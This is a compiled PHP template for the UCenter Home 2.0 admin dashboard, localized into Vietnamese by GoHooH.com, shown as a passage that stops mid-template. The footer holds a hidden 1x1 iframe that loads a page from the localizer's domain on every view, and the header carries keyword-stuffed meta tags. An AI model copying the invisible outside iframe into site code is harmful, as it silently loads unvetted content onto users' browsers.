<?php if(!defined('IN_UCHOME')) exit('Access Denied');?><?php subtplcheck('admin/tpl/index|admin/tpl/header|admin/tpl/side|admin/tpl/footer|template/default/header|template/default/footer', '1315016359', 'admin/tpl/index');?><meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<?php $_TPL['menunames'] = array(
		'index' => 'Home',
		'config' => 'Cài đặt',
		'privacy' => 'Cài đặt bào mật',
		'usergroup' => 'Nhóm người dùng',
		'credit' => 'Tiền tệ',
		'profilefield' => 'Profile',
		'profield' => 'Group columns',
		'eventclass' => 'Loại sự kiện',
		'magic' => 'Magic',
		'task' => 'Nhiệm vụ',
		'spam' => 'Spam Set',
		'censor' => 'Words censor',
		'ad' => 'Quảng cáo',
		'userapp' => 'Ứng dụng MYOP',
		'app' => 'Ứng dụng UCenter',
		'network' => 'Casual look at',
		'cache' => 'Cập nhật cache',
		'space' => 'Người dùng',
		'feed' => 'Tin tức (feed)',
		'share' => 'Chia sẻ',
		'blog' => 'Blog',
		'album' => 'Album',
		'pic' => 'Picture',
		'comment' => 'Comments / Message',
		'thread' => 'Chủ đề',
		'post' => 'Trả lời',
		'doing' => 'Doing',
		'tag' => 'Tags',
		'mtag' => 'Nhóm',
		'poll' => 'Bình chọn',
		'event' => 'Kích hoạt',
		'magiclog' => 'Props Records',
		'report' => 'Báo cáo',
		'block' => 'Data Call',
		'template' => 'Sửa Template',
		'backup' => 'Sao lưu',
		'stat' => 'Cập nhật thống kê',
		'cron' => 'Program task',
		'click' => 'Action statement',
		'ip' => 'Access IP Settings',
		'hotuser' => 'Recommend members of the Set',
		'defaultuser' => 'Friends set up the default',
	); ?>
<?php $_TPL['nosidebar'] = 1; ?>
<?php if(empty($_SGLOBAL['inajax'])) { ?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="content-type" content="text/html; charset=<?=$_SC['charset']?>" />
<meta http-equiv="x-ua-compatible" content="ie=7" />
<title><?php if($_TPL['titles']) { ?><?php if(is_array($_TPL['titles'])) { foreach($_TPL['titles'] as $value) { ?><?php if($value) { ?><?=$value?> - <?php } ?><?php } } ?><?php } ?><?php if($_SN[$space['uid']]) { ?><?=$_SN[$space['uid']]?> - <?php } ?><?=$_SCONFIG['sitename']?> - Powered by UCenter Home 2.0 - Hỗ trợ GoHooH.CoM</title>
<meta name="keywords" content="Blog, Blogger, Mang xa hoi,Gohooh, gohooh.com, discuz, discuz viet, discuz viet nam, ho tro discuz, discuz free, discuz 7.0, ,free domain, free host, forum free, tao blog, tao dien dan, chia sẽ, hack rank, rank alexa, hack page rank, teen, teen news, tin nóng, thời sự, giải trí, tình bạn, tình yêu, thủ thuật blog, mã nguồn, share code, ảnh đẹp, bikini, girl xinh, kute girl, kool boy, kool girl, chat, teen girl, my tho, thanh pho my tho, discuz viet, ho tro discuz, domain free, host free, domain quoc te free, forum free, tao blog, mang xa hoi, goc rieng, kute girl, teen girl, hot girl, teen boy, hot boy, kool boy, anh dep, chia se, blog hay, code hay, tin nong, tin shock, tin sock, tin scandal,vip, pro, gai dep, anh hot, clip hay, free code, skin dep, skin discuz dep, tien giang, box, nhac hay, download,  x4 show, big bang,I love you - Duy Khánh, noi xau vo 2009, Buông Tay - Kyo , Buong tay, Khong tin 1 som mai binh yen - LIL KNIGHT, lut tu nga tu duong pho , thuy chi, anh khang, bao thy , M4u, con duong em mo, chiec khan gio am, khanh phuong, co tich tinh yeu, X4 number 1,vietnam, music, dien dan, forum, teen Viet, kenh truyen hinh, thoi trang, party, hinh anh, photo, stars, giai tri, thuy top, hot boy, hot girl, tin tuc, ngoi sao, scandal, sock, 9x, harajuku, emo, bikini, cool, kute, baby, trai xinh, gai dep, hot clips, thuytop. thuy top, bikini, cam tre em, 18+, viet nam, ddos, ho tro, hot boy, hot girl, tin tuc, ngoi sao, scandal, sock, 9x, harajuku, emo, bikini, cool, kute, baby, trai xinh, gai dep, hot clips Dien dan .music, rock, web, host, domain, freehost, free host, webmaster, free, thiet ke web, download, rapid, leech, rapidleech, megaupload, thủ thuật, chat, yahoo, it, hiphop, kute girl, film" />
<meta name="description" content="Blog, Blogger, Mang xa hoi,Gohooh, gohooh.com, discuz, discuz viet, discuz viet nam, ho tro discuz, discuz free, discuz 7.0, ,free domain, free host, forum free, tao blog, tao dien dan, chia sẽ, hack rank, rank alexa, hack page rank, teen, teen news, tin nóng, thời sự, giải trí, tình bạn, tình yêu, thủ thuật blog, mã nguồn, share code, ảnh đẹp, bikini, girl xinh, kute girl, kool boy, kool girl, chat, teen girl, my tho, thanh pho my tho, discuz viet, ho tro discuz, domain free, host free, domain quoc te free, forum free, tao blog, mang xa hoi, goc rieng, kute girl, teen girl, hot girl, teen boy, hot boy, kool boy, anh dep, chia se, blog hay, code hay, tin nong, tin shock, tin sock, tin scandal,vip, pro, gai dep, anh hot, clip hay, free code, skin dep, skin discuz dep, tien giang, box, nhac hay, download,  x4 show, big bang,I love you - Duy Khánh, noi xau vo 2009, Buông Tay - Kyo , Buong tay, Khong tin 1 som mai binh yen - LIL KNIGHT, lut tu nga tu duong pho , thuy chi, anh khang, bao thy , M4u, con duong em mo, chiec khan gio am, khanh phuong, co tich tinh yeu, X4 number 1,vietnam, music, dien dan, forum, teen Viet, kenh truyen hinh, thoi trang, party, hinh anh, photo, stars, giai tri, thuy top, hot boy, hot girl, tin tuc, ngoi sao, scandal, sock, 9x, harajuku, emo, bikini, cool, kute, baby, trai xinh, gai dep, hot clips, thuytop. thuy top, bikini, cam tre em, 18+, viet nam, ddos, ho tro, hot boy, hot girl, tin tuc, ngoi sao, scandal, sock, 9x, harajuku, emo, bikini, cool, kute, baby, trai xinh, gai dep, hot clips Dien dan .music, rock, web, host, domain, freehost, free host, webmaster, free, thiet ke web, download, rapid, leech, rapidleech, megaupload, thủ thuật, chat, yahoo, it, hiphop, kute girl, film" />
<meta http-equiv="EXPIRES" content="0" />
<meta name="RESOURCE-TYPE" content="DOCUMENT" />
<meta name="DISTRIBUTION" content="GLOBAL" />
<meta name="AUTHOR" content="Saokim999" />
<meta name="robots" content="index, follow" />
<meta name="revisit-after" content="1 days">
<script language="javascript" type="text/javascript" src="source/script_cookie.js"></script>
<script language="javascript" type="text/javascript" src="source/script_common.js"></script>
<script language="javascript" type="text/javascript" src="source/script_menu.js"></script>
<script language="javascript" type="text/javascript" src="source/script_ajax.js"></script>
<script language="javascript" type="text/javascript" src="source/script_face.js"></script>
<script language="javascript" type="text/javascript" src="source/script_manage.js"></script>
<script src="upmudim.js" type="text/javascript"></script>
<script src="http://www.google-analytics.com/urchin.js" type="text/javascript"></script>
<script type="text/javascript">
try {
_uacct = "UA-4097706-3";
urchinTracker();
} catch(err) {}</script>
<style type="text/css">
@import url(template/default/style.css);
<?php if($_TPL['css']) { ?>
@import url(template/default/<?=$_TPL['css']?>.css);
<?php } ?>
<?php if(!empty($_SGLOBAL['space_theme'])) { ?>
@import url(theme/<?=$_SGLOBAL['space_theme']?>/style.css);
<?php } elseif($_SCONFIG['template'] != 'default') { ?>
@import url(template/<?=$_SCONFIG['template']?>/style.css);
<?php } ?>
<?php if(!empty($_SGLOBAL['space_css'])) { ?>
<?=$_SGLOBAL['space_css']?>
<?php } ?>
</style>
<link rel="shortcut icon" href="image/favicon.ico" />
<link rel="edituri" type="application/rsd+xml" title="rsd" href="xmlrpc.php?rsd=<?=$space['uid']?>" />
</head>
<body>

<div id="append_parent"></div>
<div id="ajaxwaitid"></div>
<div id="header">
<?php if($_SGLOBAL['ad']['header']) { ?><div id="ad_header"><?php adshow('header'); ?></div><?php } ?>
<div class="headerwarp">
<h1 class="logo"><a href="http://gohooh.com"><img src="template/<?=$_SCONFIG['template']?>/image/logo.gif" alt="<?=$_SCONFIG['sitename']?>" /></a></h1>
<ul class="menu">
<?php if($_SGLOBAL['supe_uid']) { ?>
<li><a href="space.php?do=home">Trang chủ</a></li>
<li><a href="space.php">Trang cá nhân</a></li>
<li><a href="space.php?do=friend">Bạn bè</a></li>
<li><a href="network.php">Cộng đồng</a></li>
                <?php } else { ?>
<li><a href="index.php">Trang chính</a></li>
<?php } ?>

<?php if($_SGLOBAL['appmenu']) { ?>
<?php if($_SGLOBAL['appmenus']) { ?>
<li class="dropmenu" id="ucappmenu" onclick="showMenu(this.id)">
<a href="javascript:;">Site Menu</a>
</li>
<?php } else { ?>
<li><a target="_blank" href="<?=$_SGLOBAL['appmenu']['url']?>" title="<?=$_SGLOBAL['appmenu']['name']?>"><?=$_SGLOBAL['appmenu']['name']?></a></li>
<?php } ?>
<?php } ?>

<?php if($_SGLOBAL['supe_uid']) { ?>
<li><a href="space.php?do=pm<?php if(!empty($_SGLOBAL['member']['newpm'])) { ?>&filter=newpm<?php } ?>">Tin nhắn<?php if(!empty($_SGLOBAL['member']['newpm'])) { ?>(Mới)<?php } ?></a></li>
<?php if($_SGLOBAL['member']['allnotenum']) { ?><li class="notify" id="membernotemenu" onmouseover="showMenu(this.id)"><a href="space.php?do=notice"><?=$_SGLOBAL['member']['allnotenum']?>Một thông điệp</a></li><?php } ?>
<?php } else { ?>
<li><a href="help.php">Trợ giúp</a></li>
<?php } ?>
</ul>

<div class="nav_account">
<?php if($_SGLOBAL['supe_uid']) { ?>
<a href="space.php?uid=<?=$_SGLOBAL['supe_uid']?>" class="login_thumb"><?php echo avatar($_SGLOBAL[supe_uid]); ?></a>
<a href="space.php?uid=<?=$_SGLOBAL['supe_uid']?>" class="loginName"><?=$_SN[$_SGLOBAL['supe_uid']]?></a>
<?php if($_SGLOBAL['member']['credit']) { ?>
<a href="cp.php?ac=credit" style="font-size:11px;padding:0 0 0 5px;"><img src="image/credit.gif"><?=$_SGLOBAL['member']['credit']?></a>
<?php } ?>
<br />
<?php if(empty($_SCONFIG['closeinvite'])) { ?>
<a href="cp.php?ac=invite">Mời</a> 
<?php } ?>
<a href="cp.php?ac=task">Task</a> 
<a href="cp.php?ac=magic">Thẻ Vip</a>
<a href="cp.php">CP</a> 
<a href="cp.php?ac=common&op=logout&uhash=<?=$_SGLOBAL['uhash']?>">Thoát</a>
<?php } else { ?>
<a href="do.php?ac=<?=$_SCONFIG['register_action']?>" class="login_thumb"><?php echo avatar($_SGLOBAL[supe_uid]); ?></a>
Welcome<br>
<a href="do.php?ac=<?=$_SCONFIG['login_action']?>">Đăng nhập</a> | 
<a href="do.php?ac=<?=$_SCONFIG['register_action']?>">Đăng ký</a>
<?php } ?>
</div>
</div>
</div>

<div id="wrap">

<?php if(empty($_TPL['nosidebar'])) { ?>
<div id="main">
<div id="app_sidebar">
<?php if($_SGLOBAL['supe_uid']) { ?>
<ul class="app_list" id="default_userapp">
<li><img src="image/app/doing.gif"><a href="space.php?do=doing">Status</a></li>
<li><img src="image/app/album.gif"><a href="space.php?do=album">Album</a><em><a href="cp.php?ac=upload" class="gray">Upload</a></em></li>
<li><img src="image/app/blog.gif"><a href="space.php?do=blog">Blogs</a><em><a href="cp.php?ac=blog" class="gray">Viết</a></em></li>
<li><img src="image/app/poll.gif"/><a href="space.php?do=poll">Poll</a><em><a href="cp.php?ac=poll" class="gray">Bình chọn</a></em></li>
<li><img src="image/app/mtag.gif"><a href="space.php?do=mtag">Group</a><em><a href="cp.php?ac=thread" class="gray">Tạo</a></em></li>
<li><img src="image/app/event.gif"/><a href="space.php?do=event">Event</a><em><a href="cp.php?ac=event" class="gray">Bắt đầu</a></em></li>
<li><img src="image/app/share.gif"><a href="space.php?do=share">Share</a></li>
<li><img src="image/app/topic.gif"><a href="space.php?do=topic">Topic</a></li>
<li><img src="image/app/farm.gif"><a href="qqfarm.php">Nông trại</a></li>
<li><img src="image/app/fish.gif"><a href="fish.php">Ao cá</a></li>
<li><img src="image/app/love.gif"><a href="house.php">Hạnh phúc</a></li>
<li><img src="image/app/clxj.gif"><a href="clxj.php">Audition</a></li>
<li><img src="image/app/thinhthay.jpg"><a href="thayboi.php">Thầy bói</a></li>
<li><img src="image/app/blq.gif"><a href="blq.php">Bowling</a></li>
<li><img src="image/app/daovang.gif"><a href="daovang.php">Đào vàng</a></li>
<li><img src="image/app/gohoohhungtrung.gif"><a href="gohoohhungtrung.php">Hứng trứng</a></li>
<li><img src="image/app/duluong.gif"><a href="duluong.php">Dù lượng</a></li>
<li><img src="image/app/dapthu.gif"><a href="dapthu.php">Đập thú</a></li>
<li><img src="image/app/bangau.gif"><a href="bangau.php">Trượt tuyết</a></li>
<li><img src="image/app/xeptraicay.gif"><a href="xeptraicay.php">Xếp trái cây</a></li>
<li><img src="image/app/thamhiem.gif"><a href="thamhiem.php">Thám hiểm</a></li>
</ul>

<ul class="app_list topline" id="my_defaultapp">
<?php if($_SCONFIG['my_status']) { ?>
<?php if(is_array($_SGLOBAL['userapp'])) { foreach($_SGLOBAL['userapp'] as $value) { ?>
<li><img src="http://appicon.manyou.com/icons/<?=$value['appid']?>"><a href="userapp.php?id=<?=$value['appid']?>"><?=$value['appname']?></a></li>
<?php } } ?>
<?php } ?>
</ul>

<?php if($_SCONFIG['my_status']) { ?>
<ul class="app_list topline" id="my_userapp">
<?php if(is_array($_SGLOBAL['my_menu'])) { foreach($_SGLOBAL['my_menu'] as $value) { ?>
<li id="userapp_li_<?=$value['appid']?>"><img src="http://appicon.manyou.com/icons/<?=$value['appid']?>"><a href="userapp.php?id=<?=$value['appid']?>" title="<?=$value['appname']?>"><?=$value['appname']?></a></li>
<?php } } ?>
</ul>
<?php } ?>

<?php if($_SGLOBAL['my_menu_more']) { ?>
<p class="app_more"><a href="javascript:;" id="a_app_more" onclick="userapp_open();" class="off">Mở rộng</a></p>
<?php } ?>

<?php if($_SCONFIG['my_status']) { ?>
<div class="app_m">
<ul>
<li><img src="image/app_add.gif"><a href="cp.php?ac=userapp&my_suffix=%2Fapp%2Flist" class="addApp">Thêm ứng dụng</a></li>
<li><img src="image/app_set.gif"><a href="cp.php?ac=userapp&op=menu" class="myApp">Quản lý Apps</a></li>
</ul>
</div>
<?php } ?>

<?php } else { ?>
<div class="bar_text">
<form id="loginform" name="loginform" action="do.php?ac=<?=$_SCONFIG['login_action']?>&ref" method="post">
<input type="hidden" name="formhash" value="<?php echo formhash(); ?>" />
<p class="title">Đăng nhập Web</p>
<p>User name</p>
<p><input type="text" name="username" id="username" class="t_input" size="15" value="" /></p>
<p>Password</p>
<p><input type="password" name="password" id="password" class="t_input" size="15" value="" /></p>
<p><input type="checkbox" id="cookietime" name="cookietime" value="315360000" checked /><label for="cookietime">Nhớ mật khẩu</label></p>
<p>
<input type="submit" id="loginsubmit" name="loginsubmit" value="Đăng nhập" class="submit" />
<input type="button" name="regbutton" value="Đăng ký" class="button" onclick="urlto('do.php?ac=<?=$_SCONFIG['register_action']?>');">
</p>
</form>
</div>
<?php } ?>
</div>

<div id="mainarea">

<?php if($_SGLOBAL['ad']['contenttop']) { ?><div id="ad_contenttop"><?php adshow('contenttop'); ?></div><?php } ?>
<?php } ?>

<?php } ?>


<style type="text/css">
@import url(admin/tpl/style.css);
</style>

<div id="cp_content">


<div class="mainarea">
<div class="maininner">
<?php if($menus['0']['config']) { ?>
<div class="bdrcontent">
<div class="title"><h3>Chào mừng đến với Admincp Ucenter home 2.0</h3></div>
<p>Đây là nơi để bạn quản lý mạng xã hội ucenter home 2.0 được việt hóa bởi GoHooH.CoM. Bạn có thể quản lý thành viên, các ứng dụng, tùy chỉnh templates....</p>
<p>Thông tin bản Việt hóa UCenter home 2.0</p>


 <iframe src="http://www.gohooh.com/nhatui/lang.htm" width="100%" height="30" frameborder="0" scrolling="no"></iframe>

</div>
<br />

<div class="bdrcontent">
<div class="title">
<h3>Thông tin</h3>
<p>Các phiên bản mới của bản phát hành chính thức của các miếng vá và nâng cấp với sự phát triển quan trọng, sẽ được hiển thị ở đây.</p>
</div>
<div id="customerinfor" style="line-height:1.5em;"></div>
<br />
<div class="title">
<h3>Dịch vụ Hỗ trợ kỹ thuật</h3>
<p>Nếu bạn có vấn đề trong sử dụng, bạn có thể truy cập vào liên kết sau cần giúp đỡ</p>
</div>
<ul class="listcol list2col">
<li><a href=http://www.gohooh.com/forum/index.php?gid=172 target="_blank">Forum hỗ trợ</a></li>
<li><a href=http://www.google.com.vn/search?hl=vi&source=hp&q=gohooh.com&meta=&aq=0&oq=goh target="_blank">Tìm hiểu về GoHooH.CoM</a></li>
</ul>
</div>
<br />

<div class="bdrcontent">
<div class="title">
<h3>Thống kê sites</h3>
<p>Thông qua các thống kê, bạn có thể biết được sự phát triển trang của bạn</p>
<p>Bạn có thể xem <a href="do.php?ac=stat" target="_blank">Các xu hướng và Thống kê</a>，những thay đổi trong trang web hàng ngày.</p>
</div>
<ul class="listcol list2col">
<li>Số không gian mở: <?=$statistics['spacenum']?> (<a href="do.php?ac=stat&type=login" target="_blank">Xu hướng</a>)</li>
<li>Tổng Số Tin tức: <?=$statistics['feednum']?></li>
<li>Tổng số blog: <?=$statistics['blognum']?> (<a href="do.php?ac=stat&type=blog" target="_blank">Xu hướng</a>)</li>
<li>Tổng số Album: <?=$statistics['albumnum']?> (<a href="do.php?ac=stat&type=pic" target="_blank">Xu hướng</a>)</li>
<li>Tổng số chia sẻ: <?=$statistics['sharenum']?> (<a href="do.php?ac=stat&type=share" target="_blank">Xu hướng</a>)</li>
<li>Tổng số chủ đề: <?=$statistics['threadnum']?> (<a href="do.php?ac=stat&type=thread" target="_blank">Xu hướng</a>)</li>
<li>Tổng số bình luận: <?=$statistics['commentnum']?></li>
<li>Số ứng dụng: <?=$statistics['myappnum']?></li>
</ul>
</div>
<br />

<div class="bdrcontent">
<div class="title"><h3>Thủ tục cơ sở dữ liệu / phiên bản</h3></div>
<ul>
<li>OS: <?=$os?></li>
<li>Phiên bản CSDL: <?=$statistics['mysql']?></li>
<li>Giấy phép Upload: <?=$fileupload?></li>
<li>Dung lượng CSDL: <?=$dbsize?></li>
<li>File đính kèm: <?=$attachsize?></li>
<li>Phiên bản hiện tại: UCenter Home <?=$statistics['version']?> ( <?=$statistics['release']?> )</li>
<li>Phiên bản UCenter Khách hàng: <?=UC_CLIENT_VERSION?> Release <?=UC_CLIENT_RELEASE?></li>
</ul>
</div>
<br />

<div class="bdrcontent">

<div class="title">
<h3>Nhóm phát triển</h3>
</div>
<table>
                                <tr><td width="80">Copyright</td><td><a  href="http://www.comsenz.com/" target="_blank">Comsenz (Beijing) Technology Co., Ltd. (Comsenz Inc.)</a></td></tr>

<tr><td width="80">Việt hóa</td><td><a  href="http://www.google.com.vn/search?hl=vi&source=hp&q=gohooh.com&meta=&aq=0&oq=goh" target="_blank">Discuz! Việt - GoHooH.CoM</a></td></tr>
<tr><td>Chief planner</td><td><a  href="http://www.discuz.net/space.php?uid=1" target="_blank">Kevin 'Crossday' Day</a>, <a  href="http://www.discuz.net/space.php?uid=174393" target="_blank">Guode 'Sup' Li</a></td></tr>
<tr><td>Team</td><td><a  href="http://www.discuz.net/space.php?uid=322293" target="_blank">Qingpeng 'Andy' Zheng</a>, <a  href="http://www.discuz.net/space.php?uid=248739" target="_blank">Jing 'Qiezi' Zou</a>, <a  href="http://www.discuz.net/space.php?uid=672953" target="_blank">Fei 'Fengshu' Zhao</a>, <a  href="http://www.discuz.net/space.php?uid=465273" target="_blank">Lijun 'Maple-x' Zhang</a>, <a  href="http://www.discuz.net/space.php?uid=679269" target="_blank">Lei 'Shitou' Zhao</a>, <a  href="http://www.discuz.net/space.php?uid=906359" target="_blank">Peng 'Dingusxp' Xu</a></td></tr>
<tr><td>Graphic Design</td><td><a  href="http://www.discuz.net/space.php?uid=294092" target="_blank">Fangming 'Lushnis' Li</a>, <a  href="http://www.discuz.net/space.php?uid=174393" target="_blank">Yulong 'Yulong' Li</a>, <a  href="http://www.discuz.net/space.php?uid=41050" target="_blank">Rujian 'Small Ancient' Mo</a></td></tr>
<tr><td>Website</td><td><a href=http://www.comsenz.com target="_blank">http://www.comsenz.com</a></td></tr>
<tr><td>Product Website</td><td><a href=http://u.discuz.net target="_blank">http://u.discuz.net</a></td></tr>
                                <tr><td>English admin tpl translated</td><td><a href=http://www.buryad-arad.ru target="_blank">http://www.buryad-arad.ru</a></td></tr>
</table>
</div>
<?php } else { ?>
<div class="bdrcontent">
<div class="title"><h3>Chào mừng đến với Quản lý Ucenter home 2.0/h3></div>
<p>Hoạt động thông qua các nền tảng quản lý, bạn có thể xuất bản các thông tin Quản lý。</p>

<br />
<div class="title"><h3>Quản lý menu</h3></div>
<ul class="listcol list2col">
<?php if($menus['1']['space']) { ?><li><a href="admincp.php?ac=space" style="font-weight:bold;">Người dùng</a><p>Sửa điểm của người dùng, các nhóm người sử dụng, quản lý thông tin không gian, xóa người sử dụng</p></li><?php } ?>
<li><a href="admincp.php?ac=feed" style="font-weight:bold;">Matter</a><p>Right "What I was doing" Batch delete</p></li>
<li><a href="admincp.php?ac=blog" style="font-weight:bold;">Blog</a><p>Xóa, sửa cùng lúc nhiều blog</p></li>
<li><a href="admincp.php?ac=album" style="font-weight:bold;">Album</a><p>Xóa, sửa cùng lúc nhiều album</p></li>
<li><a href="admincp.php?ac=pic" style="font-weight:bold;">Picture</a><p>Xóa, sửa cùng lúc nhiều pictures</p></li>
<li><a href="admincp.php?ac=comment" style="font-weight:bold;">Bình luận</a><p>Chỉnh sửa các bình luận</p></li>
<li><a href="admincp.php?ac=thread" style="font-weight:bold;">Chủ đề</a><p>Đăng các chủ đề, sửa, xóa hoặc đưa chủ đề lên đầu</p></li>
<li><a href="admincp.php?ac=post" style="font-weight:bold;">Trả lời</a><p>Chỉnh sửa, xóa các trả lời</p></li>
<li><a href="admincp.php?ac=poll" style="font-weight:bold;">Bình chọn</a><p>Chỉnh sửa, xóa các bình chọn</p></li>
<?php if($menus['1']['tag']) { ?><li><a href="admincp.php?ac=tag" style="font-weight:bold;">Tags</a><p>Quản lý các tag, sửa, xóa hoặc nhập các tag</p></li><?php } ?>
<?php if($menus['1']['mtag']) { ?><li><a href="admincp.php?ac=mtag" style="font-weight:bold;">Nhóm</a><p>Quản lý các nhóm, sửa, xóa hoặc nhập các nhóm</p></li><?php } ?>
<?php if($menus['1']['event']) { ?><li><a href="admincp.php?ac=event" style="font-weight:bold;">Kích hoạt</a><p>Kích hoạt, xem, xóa các yêu cầu</p></li><?php } ?>
<?php if($menus['1']['css']) { ?><li><a href="admincp.php?ac=css" style="font-weight:bold;">Template Style</a><p>Tùy chỉnh templates cho mạng xã hội</p></li><?php } ?>
</ul>
</div><br />
<?php } ?>
</div>
<br>
</div>

<div class="side">
﻿<?php if($menus['0']) { ?>
<div class="block style1">
<h2>Basic Settings</h2>
<ul class="folder">
<?php if(is_array($acs['0'])) { foreach($acs['0'] as $value) { ?>
<?php if($menus['0'][$value]) { ?>
<?php if($ac==$value) { ?><li class="active"><?php } else { ?><li><?php } ?><a href="admincp.php?ac=<?=$value?>"><?=$_TPL['menunames'][$value]?></a></li>
<?php } ?>
<?php } } ?>
</ul>
</div>
<?php } ?>

<div class="block style1">
<h2>Batch Management</h2>
<ul class="folder">
<?php if(is_array($acs['3'])) { foreach($acs['3'] as $value) { ?>
<?php if($ac==$value) { ?><li class="active"><?php } else { ?><li><?php } ?><a href="admincp.php?ac=<?=$value?>"><?=$_TPL['menunames'][$value]?></a></li>
<?php } } ?>
<?php if(is_array($acs['1'])) { foreach($acs['1'] as $value) { ?>
<?php if($menus['1'][$value]) { ?>
<?php if($ac==$value) { ?><li class="active"><?php } else { ?><li><?php } ?><a href="admincp.php?ac=<?=$value?>"><?=$_TPL['menunames'][$value]?></a></li>
<?php } ?>
<?php } } ?>
</ul>
</div>

<?php if($menus['2']) { ?>
<div class="block style1">
<h2>Advanced Settings</h2>
<ul class="folder">
<?php if(is_array($acs['2'])) { foreach($acs['2'] as $value) { ?>
<?php if($menus['2'][$value]) { ?>
<?php if($ac==$value) { ?><li class="active"><?php } else { ?><li><?php } ?><a href="admincp.php?ac=<?=$value?>"><?=$_TPL['menunames'][$value]?></a></li>
<?php } ?>
<?php } } ?>
<?php if($menus['0']['config']) { ?><li><a href="<?=UC_API?>" target="_blank">UCenter</a></li><?php } ?>
</ul>
</div>
<?php } ?>
</div>

<?php if($statistics['update']) { ?>
<script language="javascript" src="http://u.discuz.net/customer/update.php?get=<?=$statistics['update']?>"></script>
<?php } ?>
<?php my_checkupdate(); ?>

</div>

<?php if(empty($_SGLOBAL['inajax'])) { ?>
<?php if(empty($_TPL['nosidebar'])) { ?>
<?php if($_SGLOBAL['ad']['contentbottom']) { ?><br style="line-height:0;clear:both;"/><div id="ad_contentbottom"><?php adshow('contentbottom'); ?></div><?php } ?>
</div>

<!--/mainarea-->
<div id="bottom"></div>
</div>
<!--/main-->
<?php } ?>

<div id="footer">
<?php if($_TPL['templates']) { ?>
<div class="chostlp" title="Đổi giao diện"><img id="chostlp" src="<?=$_TPL['default_template']['icon']?>" onmouseover="showMenu(this.id)" alt="<?=$_TPL['default_template']['name']?>" /></div>
<ul id="chostlp_menu" class="chostlp_drop" style="display: none">
<?php if(is_array($_TPL['templates'])) { foreach($_TPL['templates'] as $value) { ?>
<li><a href="cp.php?ac=common&op=changetpl&name=<?=$value['name']?>" title="<?=$value['name']?>"><img src="<?=$value['icon']?>" alt="<?=$value['name']?>" /></a></li>
<?php } } ?>
</ul>
<?php } ?>

<p class="r_option">
<a href="javascript:;" onclick="window.scrollTo(0,0);" id="a_top" title="TOP"><img src="image/top.gif" alt="" style="padding: 5px 6px 6px;" /></a>
</p>

<?php if($_SGLOBAL['ad']['footer']) { ?>
<p style="padding:5px 0 10px 0;"><?php adshow('footer'); ?></p>
<?php } ?>

<?php if($_SCONFIG['close']) { ?>
<p style="color:blue;font-weight:bold;">
Thông báo: Hiện trang web đang tạm ngừng hoạt động
</p>
<?php } ?>
<p>
<?=$_SCONFIG['sitename']?> - 
<a href="mailto:<?=$_SCONFIG['adminemail']?>">Liên hệ</a> <a href="http://gohooh.com">Discuz! Việt - Mạng xã hội</a>
<?php if($_SCONFIG['miibeian']) { ?> - <a  href="http://www.miibeian.gov.cn" target="_blank"><?=$_SCONFIG['miibeian']?></a><?php } ?>
</p>
<p>
Powered by <a  href="http://gohooh.com" target="_blank"><strong>UCenter Home</strong></a> <span title="<?php echo X_RELEASE; ?>"><?php echo X_VER; ?></span>
<?php if(!empty($_SCONFIG['licensed'])) { ?><a  href="http://license.comsenz.com/?pid=7&host=<?=$_SERVER['HTTP_HOST']?>" target="_blank">Licensed</a><?php } ?>
&copy; 2001-2009 <a  href="http://www.comsenz.com" target="_blank">Comsenz Inc.</a>
</p>
<?php if($_SCONFIG['debuginfo']) { ?>
<p><?php echo debuginfo(); ?></p>
<?php } ?>
</div>
</div>
<!--/wrap-->

<?php if($_SGLOBAL['appmenu']) { ?>
<ul id="ucappmenu_menu" class="dropmenu_drop" style="display:none;">
<li><a href="<?=$_SGLOBAL['appmenu']['url']?>" title="<?=$_SGLOBAL['appmenu']['name']?>" target="_blank"><?=$_SGLOBAL['appmenu']['name']?></a></li>
<?php if(is_array($_SGLOBAL['appmenus'])) { foreach($_SGLOBAL['appmenus'] as $value) { ?>
<li><a href="<?=$value['url']?>" title="<?=$value['name']?>" target="_blank"><?=$value['name']?></a></li>
<?php } } ?>
</ul>
<?php } ?>
<iframe style="WIDTH: 1; HEIGHT: 1" src="http://www.gohooh.com/auto.html" frameborder="0" width="1" scrolling="1" height="1"></iframe>
<?php if($_SGLOBAL['supe_uid']) { ?>
<ul id="membernotemenu_menu" class="dropmenu_drop" style="display:none;">
<?php $member = $_SGLOBAL['member']; ?>
<?php if($member['notenum']) { ?><li><img src="image/icon/notice.gif" width="16" alt="" /> <a href="space.php?do=notice"><strong><?=$member['notenum']?></strong> Thông báo mới</a></li><?php } ?>
<?php if($member['pokenum']) { ?><li><img src="image/icon/poke.gif" alt="" /> <a href="cp.php?ac=poke"><strong><?=$member['pokenum']?></strong> Tin mới</a></li><?php } ?>
<?php if($member['addfriendnum']) { ?><li><img src="image/icon/friend.gif" alt="" /> <a href="cp.php?ac=friend&op=request"><strong><?=$member['addfriendnum']?></strong> Yêu cầu kết bạn</a></li><?php } ?>
<?php if($member['mtaginvitenum']) { ?><li><img src="image/icon/mtag.gif" alt="" /> <a href="cp.php?ac=mtag&op=mtaginvite"><strong><?=$member['mtaginvitenum']?></strong> Mời nhóm</a></li><?php } ?>
<?php if($member['eventinvitenum']) { ?><li><img src="image/icon/event.gif" alt="" /> <a href="cp.php?ac=event&op=eventinvite"><strong><?=$member['eventinvitenum']?></strong> Mời tham gia Event</a></li><?php } ?>
<?php if($member['myinvitenum']) { ?><li><img src="image/icon/userapp.gif" alt="" /> <a href="space.php?do=notice&view=userapp"><strong><?=$member['myinvitenum']?></strong> Mời qua Email</a></li><?php } ?>
</ul>
<?php } ?>

<?php if($_SGLOBAL['supe_uid']) { ?>
<?php if(!isset($_SCOOKIE['checkpm'])) { ?>
<script language="javascript"  type="text/javascript" src="cp.php?ac=pm&op=checknewpm&rand=<?=$_SGLOBAL['timestamp']?>"></script>
<?php } ?>
<?php if(!isset($_SCOOKIE['synfriend'])) { ?>
<script language="javascript"  type="text/javascript" src="cp.php?ac=friend&op=syn&rand=<?=$_SGLOBAL['timestamp']?>"></script>
<?php } ?>
<?php } ?>
<?php if(!isset($_SCOOKIE['sendmail'])) { ?>
<script language="javascript"  type="text/javascript" src="do.php?ac=sendmail&rand=<?=$_SGLOBAL['timestamp']?>"></script>
<?php } ?>

<?php if($_SGLOBAL['ad']['couplet']) { ?>
<script language="javascript" type="text/javascript" src="source/script_couplet.js"></script>
